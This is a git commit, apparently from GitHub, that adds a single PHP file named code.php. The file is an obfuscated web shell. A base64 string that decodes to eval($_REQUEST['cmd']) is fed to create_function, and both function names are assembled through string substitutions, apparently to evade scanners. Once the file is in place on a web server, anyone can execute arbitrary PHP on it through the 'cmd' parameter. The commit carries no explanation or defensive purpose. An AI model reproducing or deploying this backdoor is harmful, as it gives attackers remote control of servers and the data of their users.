8fa329f3128d4bbb2ad45f6dc2e8a9ca4a3c5033
T4nGg <113728553+T4nGg@users.noreply.github.com>
2022-09-17 05:46:49 +0800

    Create code.php

---
+++ code.php
@@ -0,0 +1,13 @@
+<?php
+$code = 'ZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs=';   
+function create(){
+return str_ireplace("test","create_fun","testction");
+}
+$base64=strtr("bask64_mkcomk","km","ed");
+$cre=create();
+$re=$cre('',$base64($code))
+?>
+
+<?php
+$re()
+?>
